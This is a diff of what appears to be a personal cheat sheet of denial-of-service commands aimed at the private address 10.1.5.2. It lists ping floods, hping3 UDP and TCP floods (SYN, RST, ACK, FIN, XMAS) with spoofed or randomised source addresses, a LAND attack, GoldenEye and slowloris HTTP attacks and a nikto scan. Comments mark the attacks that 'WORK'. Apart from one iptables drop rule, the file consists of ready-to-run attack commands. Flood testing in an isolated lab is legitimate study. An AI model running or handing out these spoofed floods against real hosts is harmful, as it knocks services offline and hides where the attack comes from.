@@ -1,9 +1,57 @@
-# Ping flood with Ping
-sudo ping -f 10.1.5.2
+# Ping of death
+sudo ping -f -s 65500 10.1.5.2
 
+# WORK
 # Ping flood with hping3
-sudo hping3 -1 --flood 10.1.5.2
+sudo apt install hping3 -y
+sudo hping3 -1 --flood -a spoofedIP 10.1.5.2 
+sudo hping3 -1 --flood --rand-source 10.1.5.2 
+
+# WORK
+# Ping flood not fragmented with hping3
+sudo hping3 -1 -y --flood -a spoofedIP 10.1.5.2 
+sudo hping3 -1 -y --flood --rand-source 10.1.5.2 
+
+# UDP flood
+sudo hping3 -2 --flood --rand-source 10.1.5.2 
+
+# LAND attack
+sudo hping3 -S --flood --baseport 80 --keep --destport 80 10.1.5.2 -a 10.1.5.2
+
+# WORK
+# TCP SYN flood
+sudo hping3 -S --flood --destport 80 -a spoofedIP 10.1.5.2
+# Drop packet on the spoofedIP
+sudo iptables -I INPUT -s 10.1.5.2 -p tcp --tcp-flags URG,SYN,PSH,RST,FIN SYN -j DROP
+sudo hping3 -S --flood --destport 80 --rand-source 10.1.5.2
+
+# TCP RST flood
+sudo hping3 -R --flood --destport 80 --rand-source 10.1.5.2
+
+# WORK
+# TCP ACK flood
+sudo hping3 -A --flood --destport 80 -a spoofedIP 10.1.5.2
+sudo hping3 -A --flood --destport 80 --rand-source 10.1.5.2
+
+# TCP FIN flood
+# First open connection to spoofed IP
+sudo hping3 -F --flood --destport 80 -a spoofedIP 10.1.5.2
+sudo hping3 -F --flood --destport 80 --rand-source 10.1.5.2
+
+# TCP XMAS flood
+sudo hping3 -X --flood --destport 80 --rand-source 10.1.5.2
 
 # HTTP DoS goldeneye
 sudo python goldeneye.py http://10.1.5.2:80/
 sudo python goldeneye.py http://10.1.5.2:80/ -m post
+
+# Apache benchmark
+sudo apt-get install apache2-utils
+ab -t 10 -n 10000 -c 100 http://10.1.5.2
+
+# HTTP slow DoS
+python3 slowloris.py 10.1.5.2
+
+# Vulnerability Scan
+sudo apt-get install nikto -y
+nikto -h 10.1.5.2 -p 80
